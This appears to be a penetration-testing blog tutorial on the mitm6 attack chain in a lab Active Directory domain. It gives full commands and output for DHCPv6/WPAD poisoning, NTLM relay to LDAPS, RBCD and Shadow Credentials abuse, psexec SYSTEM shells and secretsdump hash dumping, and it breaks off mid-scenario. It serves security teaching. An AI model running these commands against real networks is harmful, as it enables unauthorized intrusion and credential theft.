---
title: "mitm6 — From DHCPv6 Poisoning to Domain Admin Impersonation via NTLM Relay & RBCD"
date: 2026-03-24 11:00:00 +0200
categories: [Active Directory, NTLM Relay Attacks]
tags: [mitm6, dhcpv6, ipv6, wpad, ntlm-relay, rbcd, resource-based-constrained-delegation, shadow-credentials, kerberos, active-directory, red-team, penetration-testing]
description: "A comprehensive guide to the mitm6 attack chain — exploiting DHCPv6 auto-configuration and WPAD abuse to perform NTLM relay attacks against LDAP, enabling RBCD abuse and Shadow Credentials for full domain compromise. Includes multiple attack scenarios from Linux and Windows machines, step-by-step commands, CVEs, and mitigations."
image:
  path: /assets/img/posts/mitm6-attack-banner.png
  alt: mitm6 DHCPv6 Poisoning to RBCD Attack Flow
pin: true
---

## Introduction

What if I told you that you could become a **local Domain Administrator** on any machine in a Windows network — without knowing a single password, without having any Active Directory credentials, and without exploiting a single software vulnerability?

That's the beauty of the **mitm6 + NTLM relay + RBCD** attack chain. It works against **default configurations** in virtually every Windows Active Directory environment. No zero-days. No malware. No credentials required. Just protocol abuse at its finest.

This blog post is based on the **"@Hack 2021 Briefings"** presentation titled **"Local Domain Admin Impersonation"** by **Ebrahem Hegazy**. The underlying research was pioneered by **Dirk-jan Mollema** (the author of [mitm6](https://github.com/dirkjanm/mitm6)) and **Elad Shamir** (who authored the foundational [Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) research on Resource-Based Constrained Delegation abuse).

### What Does "Local Domain Admin" Mean?

When we say "Local Domain Admin Impersonation," we mean the attacker can **impersonate the Domain Administrator on a specific machine** — not that they become a true Domain Admin across the entire domain. Through S4U2Proxy delegation, the attacker obtains a valid Kerberos service ticket that lets them act as `Administrator` on the **targeted workstation or server**. From there, credential dumping and lateral movement can escalate the attack to full domain compromise.

### When Do You Need This Attack?

This attack is invaluable in the following scenarios:

- **No credentials at all** — You've just plugged into a network jack or connected to the corporate Wi-Fi, and you have zero domain credentials.
- **Initial foothold** — You're at the very beginning of an engagement and need to bootstrap access.
- **Physical access / Drop device** — You've deployed a Raspberry Pi or similar device on the target network and need it to autonomously compromise machines.
- **Assumed breach without creds** — The client's scope says "assume network access" but hasn't provided any accounts.

> The entire attack chain from DHCPv6 poisoning to SYSTEM shell requires **zero Active Directory credentials**. This is what makes it one of the most powerful initial access techniques available to red teams and penetration testers.
{: .prompt-info }

---

## Attack Theory — Why This Works

Before diving into the commands, it's critical to understand **why** this attack works. Every component exploits a **default behavior** in Windows and Active Directory — nothing needs to be misconfigured.

### 1. Windows Prefers IPv6 Over IPv4

By design, Windows operating systems **prefer IPv6 over IPv4**. When a Windows machine boots up, reconnects to the network, or renews its DHCP lease, it sends out **DHCPv6 Solicit messages** looking for an IPv6 DHCP server — even in environments that exclusively use IPv4. This is default behavior on every Windows version from Vista onwards.

If no legitimate DHCPv6 server responds, the request goes unanswered under normal circumstances. But if an attacker is listening...

### 2. Rogue DHCPv6 Server (mitm6)

The tool **mitm6** exploits this by acting as a rogue DHCPv6 server. When it detects a DHCPv6 Solicit message from a victim, it responds with:

- A **link-local IPv6 address** for the victim
- The **attacker's IP as the primary DNS server**

Now the attacker controls DNS resolution for the victim. This is the foundation of the entire attack.

### 3. WPAD Abuse (Web Proxy Auto-Discovery)

Windows machines are configured by default (in many environments) to automatically discover proxy servers using the **WPAD (Web Proxy Auto-Discovery Protocol)**. The machine queries DNS for `wpad.<domain>` to find a Proxy Auto-Config (PAC) file.

Since the attacker now controls DNS (via mitm6), they can respond to WPAD queries with their own IP address. When the victim requests the `wpad.dat` PAC file, **ntlmrelayx** serves a malicious PAC file that forces the victim to authenticate via NTLM to access the "proxy."

### 4. NTLM Relay to LDAP(S)

When the victim's machine account authenticates to the attacker's fake WPAD proxy via HTTP, it sends **NTLM authentication**. Unlike SMB-based NTLM (which often has signing enforced), HTTP-based NTLM authentication can be **relayed to LDAP and LDAPS** on the Domain Controller because:

- LDAP signing is **not enforced by default**
- LDAP channel binding is **not enforced by default**

The attacker relays the machine account's NTLM authentication to the DC's LDAP(S) service.

### 5. ms-DS-MachineAccountQuota — Creating Machine Accounts

By default, Active Directory allows **any authenticated domain user** (including machine accounts) to create up to **10 computer accounts** in the domain. This is controlled by the `ms-DS-MachineAccountQuota` attribute, which defaults to `10`.

Using the relayed NTLM authentication, ntlmrelayx creates a new machine account under the attacker's control.

### 6. Resource-Based Constrained Delegation (RBCD)

Here's the critical piece: a computer account in AD can modify its **own** `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute via LDAP. But through the relayed authentication, ntlmrelayx modifies the **victim's** attribute instead, setting it to allow the **newly created attacker machine account** to impersonate any user to any service on the victim machine.

### 7. S4U2Self + S4U2Proxy — Impersonation

With RBCD configured, the attacker uses the **S4U2Self** extension to obtain a forwardable service ticket to themselves as any user (e.g., `Administrator`), then uses **S4U2Proxy** to present that ticket to the victim machine's service (e.g., CIFS). The result: a valid Kerberos service ticket as `Administrator` for the victim machine.

### Attack Flow Summary

```
Victim boots/reconnects
       │
       ▼
DHCPv6 Solicit ──────► mitm6 responds (attacker = DNS server)
       │
       ▼
DNS query: wpad.inlanefreight.local ──────► mitm6 responds (attacker IP)
       │
       ▼
HTTP request for wpad.dat ──────► ntlmrelayx serves PAC file
       │
       ▼
NTLM authentication to "proxy" ──────► ntlmrelayx relays to LDAPS on DC
       │
       ▼
LDAP: Create machine account (AADDKXBP$)
       │
       ▼
LDAP: Set msDS-AllowedToActOnBehalfOfOtherIdentity on VICTIM$
       │                (AADDKXBP$ allowed to delegate)
       ▼
getST.py: S4U2Self + S4U2Proxy ──────► Service ticket as Administrator
       │
       ▼
psexec.py with ticket ──────► NT AUTHORITY\SYSTEM shell on VICTIM
```

---

## Prerequisites and Enumeration

### Prerequisites Table

| Requirement | Description | Default? |
|---|---|---|
| **IPv6 enabled** | Windows has IPv6 enabled with no legitimate DHCPv6 server | ✅ Yes (default on all modern Windows) |
| **MachineAccountQuota > 0** | Domain users can create machine accounts | ✅ Yes (default = 10) |
| **LDAP signing not enforced** | DC accepts unsigned LDAP connections | ✅ Yes (not enforced by default) |
| **LDAP channel binding not required** | DC does not require channel binding tokens | ✅ Yes (not required by default) |
| **WPAD auto-discovery** | Clients look for proxy auto-config via DNS | ✅ Yes (default in most configs) |
| **Network access** | Attacker on same broadcast domain as victims | ⚠️ Required (physical or via VPN/pivot) |

> Every single prerequisite in this table is **enabled by default** in standard Active Directory deployments. The only requirement the attacker must satisfy is being on the same network segment.
{: .prompt-warning }

### Enumeration Commands

#### Check MachineAccountQuota (MAQ)

Using **NetExec (nxc)**:

```bash
hacker@root[/root]$ nxc ldap 172.16.117.3 -u '' -p '' -M maq
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\:
MAQ         172.16.117.3    389    DC01             [*] Getting the MachineAccountQuota
MAQ         172.16.117.3    389    DC01             MachineAccountQuota: 10
```

Using **ldapsearch**:

```bash
hacker@root[/root]$ ldapsearch -x -H ldap://172.16.117.3 -D '' -w '' -b 'DC=inlanefreight,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota
# inlanefreight.local
dn: DC=inlanefreight,DC=local
ms-DS-MachineAccountQuota: 10
```

Using **PowerShell** (from a domain-joined machine):

```powershell
PS C:\Tools> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
ms-DS-MachineAccountQuota : 10
```

#### Check LDAP Signing

```bash
hacker@root[/root]$ nxc ldap 172.16.117.3 -u '' -p '' -M ldap-checker
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\:
LDAP-CHEC.. 172.16.117.3    389    DC01             LDAP Signing NOT Enforced!
LDAP-CHEC.. 172.16.117.3    389    DC01             LDAPS Channel Binding is set to "NEVER" - Time to relay!
```

#### Check IPv6 Status on Targets

```bash
hacker@root[/root]$ nxc smb 172.16.117.0/24 --gen-relay-list targets.txt
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.10   445    WS01             [*] Windows 10 Build 19041 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.20   445    SRV01            [*] Windows Server 2019 Build 17763 x64 (name:SRV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
```

> You can also use `ping6` or check for IPv6 link-local addresses in your ARP/neighbor tables to confirm IPv6 is active on target machines. If you see `fe80::` addresses, IPv6 is enabled.
{: .prompt-tip }

---

## Attack Scenarios

This section covers **8 distinct attack scenarios**, starting with the classic no-credentials attack from the original presentation, and expanding to alternative techniques for different situations.

### Lab Environment

| Host | IP Address | Role |
|---|---|---|
| DC01.inlanefreight.local | 172.16.117.3 | Domain Controller |
| WS01.inlanefreight.local | 172.16.117.10 | Victim Workstation |
| SRV01.inlanefreight.local | 172.16.117.20 | Member Server |
| CA01.inlanefreight.local | 172.16.117.5 | Certificate Authority |
| Attacker (Linux) | 172.16.117.100 | Kali/Parrot Attack Machine |

---

### Scenario 1: Classic mitm6 + RBCD — No Credentials Required (Linux)

This is the **primary attack** from the @Hack 2021 presentation. It demonstrates the full attack chain from zero credentials to SYSTEM shell using only a Linux attack machine.

#### Step 1: Start mitm6 as Rogue DHCPv6 Server

**Description:** mitm6 listens for DHCPv6 Solicit messages on the local network and responds as a rogue DHCPv6 server, assigning itself as the victim's DNS server. The `--no-ra` flag prevents sending Router Advertisements, which some network monitoring systems may detect.

```bash
hacker@root[/root]$ sudo mitm6 -d inlanefreight.local --no-ra
Starting mitm6 using interface eth0
IPv4 address: 172.16.117.100
IPv6 address: fe80::a00:27ff:fe4e:66a1
MAC address: 08:00:27:4e:66:a1
WARNING: Running mitm6 for extended periods can cause network issues. Use in 5-10 minute sprints.

Listening for DHCPv6 multicasts...
```

mitm6 is now waiting for DHCPv6 requests. In a real environment, these come when machines boot up, reconnect to the network, or renew their DHCP lease.

#### Step 2: Start ntlmrelayx with RBCD Delegation

**Description:** ntlmrelayx is configured to listen for incoming NTLM authentication (both IPv4 and IPv6 with `-6`), act as a WPAD server (with `-wh`), and relay captured authentication to the LDAPS service on the Domain Controller. The `--delegate-access` flag instructs it to configure RBCD, and `--add-computer` creates a new machine account.

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -ts -6 -t ldaps://172.16.117.3 -wh fakewpad.inlanefreight.local --delegate-access --add-computer
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[2026-03-24 11:02:31] [*] Protocol Client DCSYNC loaded..
[2026-03-24 11:02:31] [*] Protocol Client HTTP loaded..
[2026-03-24 11:02:31] [*] Protocol Client HTTPS loaded..
[2026-03-24 11:02:31] [*] Protocol Client IMAP loaded..
[2026-03-24 11:02:31] [*] Protocol Client IMAPS loaded..
[2026-03-24 11:02:31] [*] Protocol Client LDAP loaded..
[2026-03-24 11:02:31] [*] Protocol Client LDAPS loaded..
[2026-03-24 11:02:31] [*] Protocol Client MSSQL loaded..
[2026-03-24 11:02:31] [*] Protocol Client RPC loaded..
[2026-03-24 11:02:31] [*] Protocol Client SMB loaded..
[2026-03-24 11:02:31] [*] Protocol Client SMTP loaded..
[2026-03-24 11:02:31] [*] Running in relay mode to single host
[2026-03-24 11:02:31] [*] Setting up SMB Server
[2026-03-24 11:02:31] [*] Setting up HTTP Server on port 80
[2026-03-24 11:02:31] [*] Setting up WCF Server
[2026-03-24 11:02:31] [*] Setting up RAW Server on port 6666
[2026-03-24 11:02:31] [*] Servers started, waiting for connections
```

Both tools are now running. Time to wait.

#### Step 3: Wait for Victim Machine to Boot/Renew

**Description:** When a victim machine boots up, renews its DHCP lease, or reconnects to the network, mitm6 responds to its DHCPv6 request. The victim's DNS is now poisoned, and when Windows queries for `wpad.inlanefreight.local`, the attacker's IP is returned. The victim's browser/OS then requests the WPAD PAC file from the attacker, triggering NTLM authentication which ntlmrelayx relays to the DC's LDAPS service.

**mitm6 output** (when victim WS01 boots):

```
IPv6 address fe80::7405:91a2:c3b1:248f is now assigned to WS01.inlanefreight.local
Sent spoofed reply for wpad.inlanefreight.local. to fe80::7405:91a2:c3b1:248f
Sent spoofed reply for wpad.inlanefreight.local. to fe80::7405:91a2:c3b1:248f
```

**ntlmrelayx output** (relay and RBCD setup):

```
[2026-03-24 11:05:47] [*] HTTPD(80): Client requested path: /wpad.dat
[2026-03-24 11:05:47] [*] HTTPD(80): Serving PAC file to client ::ffff:172.16.117.10
[2026-03-24 11:05:47] [*] HTTPD(80): Client requested path: http://www.msftconnecttest.com/connecttest.txt
[2026-03-24 11:05:48] [*] HTTPD(80): Connection from ::ffff:172.16.117.10 controlled, attacking target ldaps://172.16.117.3
[2026-03-24 11:05:48] [*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[2026-03-24 11:05:48] [*] Enumerating relayed user's privileges. This may take a while on large domains
[2026-03-24 11:05:49] [*] Attempting to create computer in: CN=Computers,DC=inlanefreight,DC=local
[2026-03-24 11:05:49] [*] Adding new computer with username: AADDKXBP$ and password: A.RpxW+?Q!`\1^F
[2026-03-24 11:05:49] [+] Successfully added machine account AADDKXBP$ with password A.RpxW+?Q!`\1^F.
[2026-03-24 11:05:49] [*] Delegation rights modified successfully!
[2026-03-24 11:05:49] [*] AADDKXBP$ can now impersonate users on WS01$ via S4U2Proxy
[2026-03-24 11:05:49] [*] AADDKXBP$ can now impersonate users on WS01$ via S4U2Proxy
```

> **What just happened?** ntlmrelayx relayed WS01's machine account NTLM authentication to the DC via LDAPS. Using that authenticated session, it: (1) created a new computer account `AADDKXBP$` with a random password, (2) modified WS01's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow `AADDKXBP$` to impersonate any user on WS01 via S4U2Proxy. All of this happened automatically.
{: .prompt-info }

#### Step 4: Request Service Ticket via S4U2Proxy (Impersonate Administrator)

**Description:** Now that RBCD is configured, we use Impacket's `getST.py` to perform the S4U2Self + S4U2Proxy exchange. This requests a Kerberos service ticket for the CIFS service on WS01 as the `Administrator` user, using the credentials of the machine account we just created.

```bash
hacker@root[/root]$ getST.py -spn cifs/ws01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT/AADDKXBP$:A.RpxW+?Q!\`\1^F"
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Getting TGT for AADDKXBP$
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ws01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
```

We now have a valid Kerberos service ticket cached as `Administrator` for the CIFS service on WS01.

#### Step 5: Pass-the-Ticket — Access Target Machine

**Description:** Export the Kerberos ccache file into the `KRB5CCNAME` environment variable and use it with Impacket's `psexec.py` to get a SYSTEM shell on the target. The `-k` flag tells psexec to use Kerberos authentication, and `-no-pass` means no password is needed (the ticket handles authentication).

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_ws01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass ws01.inlanefreight.local
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on ws01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file aBvCdEfG.exe
[*] Opening SVCManager on ws01.inlanefreight.local.....
[*] Creating service XYZW on ws01.inlanefreight.local.....
[*] Starting service XYZW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WS01

C:\Windows\system32> ipconfig
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : inlanefreight.local
   IPv4 Address. . . . . . . . . . . : 172.16.117.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.117.1
```

**We now have a SYSTEM shell on WS01** — with zero prior credentials.

#### Step 6: Dump Credentials with secretsdump

**Description:** With our Kerberos ticket, we can also use `secretsdump.py` to remotely dump the SAM database, cached credentials, and LSA secrets from the target machine.

```bash
hacker@root[/root]$ secretsdump.py -k -no-pass ws01.inlanefreight.local
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Target system bootKey: 0x8b6c4a2e1d3f5a7b9c0e2d4f6a8b0c1d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b9a7e3c8d2f1a5e6b0c9d8e7f3a2b1c:::
svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:87d3a0e5b92f1c4d6e8a0b3c5d7f9e2a:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/j.smith:$DCC2$10240#j.smith#a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
INLANEFREIGHT.LOCAL/m.jones:$DCC2$10240#m.jones#f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
INLANEFREIGHT\WS01$:plain_password_hex:4a6f686e446f6531323334
INLANEFREIGHT\WS01$:aad3b435b51404eeaad3b435b51404ee:2c8f9a3b5d1e4f7a8b0c9d2e3f5a6b7c:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
dpapi_userkey:0x9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b
[*] NL$KM
 0000   AA BB CC DD EE FF 00 11   22 33 44 55 66 77 88 99   ........"3DUfw..
[*] Cleaning up...
```

> The captured NTLM hashes can be used for **Pass-the-Hash** attacks against other machines in the domain, and the cached domain credentials can be cracked offline. The machine account hash can also be used for further lateral movement.
{: .prompt-tip }

> **CRITICAL:** mitm6 should only be run in **5–10 minute sprints**. Running it continuously will cause network outages by disrupting DNS resolution for all IPv6-enabled machines in the broadcast domain. Start it, wait for a connection, and then stop it immediately.
{: .prompt-danger }

---

### Scenario 2: mitm6 + RBCD with --escalate-user (Existing Machine Account)

**Use case:** The `ms-DS-MachineAccountQuota` is set to `0` (no new machine accounts can be created), but you have already compromised an existing machine account (e.g., `plaintext$`) through other means. Instead of creating a new machine account, you configure RBCD using the existing one.

#### Step 1: Start mitm6

```bash
hacker@root[/root]$ sudo mitm6 -d inlanefreight.local --no-ra
Starting mitm6 using interface eth0
IPv4 address: 172.16.117.100
IPv6 address: fe80::a00:27ff:fe4e:66a1
MAC address: 08:00:27:4e:66:a1
WARNING: Running mitm6 for extended periods can cause network issues. Use in 5-10 minute sprints.

Listening for DHCPv6 multicasts...
```

#### Step 2: Start ntlmrelayx with --escalate-user

**Description:** Instead of `--add-computer`, we use `--escalate-user` to specify an existing machine account. ntlmrelayx will configure RBCD on the victim's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, allowing the specified machine account to delegate.

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -ts -6 -t ldaps://172.16.117.3 -wh fakewpad.inlanefreight.local --delegate-access --escalate-user 'plaintext$'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[2026-03-24 11:10:05] [*] Protocol Client DCSYNC loaded..
[2026-03-24 11:10:05] [*] Protocol Client HTTP loaded..
[2026-03-24 11:10:05] [*] Protocol Client HTTPS loaded..
[2026-03-24 11:10:05] [*] Protocol Client LDAP loaded..
[2026-03-24 11:10:05] [*] Protocol Client LDAPS loaded..
[2026-03-24 11:10:05] [*] Protocol Client MSSQL loaded..
[2026-03-24 11:10:05] [*] Protocol Client SMB loaded..
[2026-03-24 11:10:05] [*] Running in relay mode to single host
[2026-03-24 11:10:05] [*] Setting up SMB Server
[2026-03-24 11:10:05] [*] Setting up HTTP Server on port 80
[2026-03-24 11:10:05] [*] Setting up WCF Server
[2026-03-24 11:10:05] [*] Setting up RAW Server on port 6666
[2026-03-24 11:10:05] [*] Servers started, waiting for connections
```

#### Step 3: Wait for Victim Authentication and Relay

```
[2026-03-24 11:14:22] [*] HTTPD(80): Client requested path: /wpad.dat
[2026-03-24 11:14:22] [*] HTTPD(80): Serving PAC file to client ::ffff:172.16.117.10
[2026-03-24 11:14:23] [*] HTTPD(80): Connection from ::ffff:172.16.117.10 controlled, attacking target ldaps://172.16.117.3
[2026-03-24 11:14:23] [*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[2026-03-24 11:14:23] [*] Enumerating relayed user's privileges. This may take a while on large domains
[2026-03-24 11:14:24] [*] Delegation rights modified successfully!
[2026-03-24 11:14:24] [*] plaintext$ can now impersonate users on WS01$ via S4U2Proxy
```

#### Step 4: Request Service Ticket Using the Existing Machine Account

```bash
hacker@root[/root]$ getST.py -spn cifs/ws01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT/plaintext$:Passw0rd123"
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Getting TGT for plaintext$
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ws01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
```

#### Step 5: Get Shell

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_ws01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass ws01.inlanefreight.local
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on ws01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file qRsTuVwX.exe
[*] Opening SVCManager on ws01.inlanefreight.local.....
[*] Creating service ABCD on ws01.inlanefreight.local.....
[*] Starting service ABCD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

> This scenario is essential when the organization has hardened their environment by setting `ms-DS-MachineAccountQuota` to 0. If you can compromise any machine account through other means (LLMNR poisoning, phishing, etc.), you can still perform the RBCD attack.
{: .prompt-tip }

---

### Scenario 3: mitm6 + Shadow Credentials (No Machine Account Needed)

**Use case:** An alternative to RBCD that doesn't require creating or controlling a machine account at all. Instead of configuring delegation, this attack modifies the victim's `msDS-KeyCredentialLink` attribute to add a public key controlled by the attacker. The attacker can then use PKINIT to authenticate as the victim's machine account.

> Shadow Credentials requires that the domain has at least one Domain Controller running **Windows Server 2016 or later** and that AD CS (or at least a CA key pair) is available for the PKINIT session key exchange.
{: .prompt-info }

#### Step 1: Start mitm6

```bash
hacker@root[/root]$ sudo mitm6 -d inlanefreight.local --no-ra
Starting mitm6 using interface eth0
IPv4 address: 172.16.117.100
IPv6 address: fe80::a00:27ff:fe4e:66a1
MAC address: 08:00:27:4e:66:a1
WARNING: Running mitm6 for extended periods can cause network issues. Use in 5-10 minute sprints.

Listening for DHCPv6 multicasts...
```

#### Step 2: Start ntlmrelayx with Shadow Credentials

**Description:** The `--shadow-credentials` flag tells ntlmrelayx to modify the target's `msDS-KeyCredentialLink` attribute instead of configuring RBCD. The `--shadow-target` specifies which computer account to modify. We use `--no-validate-privs`, `--no-dump`, and `--no-da` to avoid unnecessary LDAP queries.

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -6 -t ldap://172.16.117.3 --shadow-credentials --shadow-target 'WS01$' -wh fakewpad.inlanefreight.local --no-validate-privs --no-dump --no-da
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

#### Step 3: Wait for Relay and Shadow Credential Injection

```
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving PAC file to client ::ffff:172.16.117.10
[*] HTTPD(80): Connection from ::ffff:172.16.117.10 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[*] Searching for the target account
[*] Target user found: CN=WS01,CN=Computers,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d30f1f28-2ac7-0094-dba3-889e44050e75
[*] Updating the msDS-KeyCredentialLink attribute of WS01$
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: jvOs1DVT.pfx
[*] Must be used with password: 874guT1ctGMTqvqm7NND
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx jvOs1DVT.pfx -pfx-pass 874guT1ctGMTqvqm7NND inlanefreight.local/WS01$ jvOs1DVT.ccache
```

#### Step 4: Use PKINITtools to Get TGT

**Description:** Use `gettgtpkinit.py` from PKINITtools to perform PKINIT authentication using the generated certificate, obtaining a TGT as WS01$.

```bash
hacker@root[/root]$ python3 PKINITtools/gettgtpkinit.py -cert-pfx jvOs1DVT.pfx -pfx-pass 874guT1ctGMTqvqm7NND inlanefreight.local/WS01$ jvOs1DVT.ccache
2026-03-24 11:20:15,123 minikerberos INFO     Loading certificate and key from PFX
2026-03-24 11:20:15,234 minikerberos INFO     Requesting TGT
2026-03-24 11:20:15,456 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-03-24 11:20:15,456 minikerberos INFO     a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
2026-03-24 11:20:15,567 minikerberos INFO     Saved TGT to file jvOs1DVT.ccache
```

#### Step 5: Extract NT Hash from the TGT

**Description:** Use `getnthash.py` to extract the NT hash of the WS01$ machine account from the PAC in the TGT.

```bash
hacker@root[/root]$ export KRB5CCNAME=jvOs1DVT.ccache
hacker@root[/root]$ python3 PKINITtools/getnthash.py inlanefreight.local/WS01$ -key a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
2c8f9a3b5d1e4f7a8b0c9d2e3f5a6b7c
```

#### Step 6: Use the Machine Account Hash for S4U2Self or Pass-the-Hash

```bash
hacker@root[/root]$ getST.py -spn cifs/ws01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 -hashes :2c8f9a3b5d1e4f7a8b0c9d2e3f5a6b7c "INLANEFREIGHT/WS01$"
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ws01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
```

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_ws01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass ws01.inlanefreight.local
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on ws01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file mNoPqRsT.exe
[*] Opening SVCManager on ws01.inlanefreight.local.....
[*] Creating service EFGH on ws01.inlanefreight.local.....
[*] Starting service EFGH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

> **Shadow Credentials vs RBCD:** Shadow Credentials has the advantage of not requiring a new machine account (bypasses MAQ=0), but it requires a domain with PKINIT support (Server 2016+) and leaves a detectable artifact in the `msDS-KeyCredentialLink` attribute. RBCD is more universally applicable but requires MAQ > 0 or a pre-existing machine account.
{: .prompt-info }

---

### Scenario 4: mitm6 + AD CS ESC8 (Certificate Relay)

**Use case:** If the environment has **Active Directory Certificate Services (AD CS)** with web enrollment enabled, you can relay to the certificate authority's HTTP endpoint instead of LDAP. This requests a machine certificate for the victim, which can then be used to authenticate as that machine account.

#### Step 1: Start mitm6

```bash
hacker@root[/root]$ sudo mitm6 -d inlanefreight.local --no-ra
Starting mitm6 using interface eth0
IPv4 address: 172.16.117.100
IPv6 address: fe80::a00:27ff:fe4e:66a1
MAC address: 08:00:27:4e:66:a1
WARNING: Running mitm6 for extended periods can cause network issues. Use in 5-10 minute sprints.

Listening for DHCPv6 multicasts...
```

#### Step 2: Start ntlmrelayx Targeting AD CS Web Enrollment

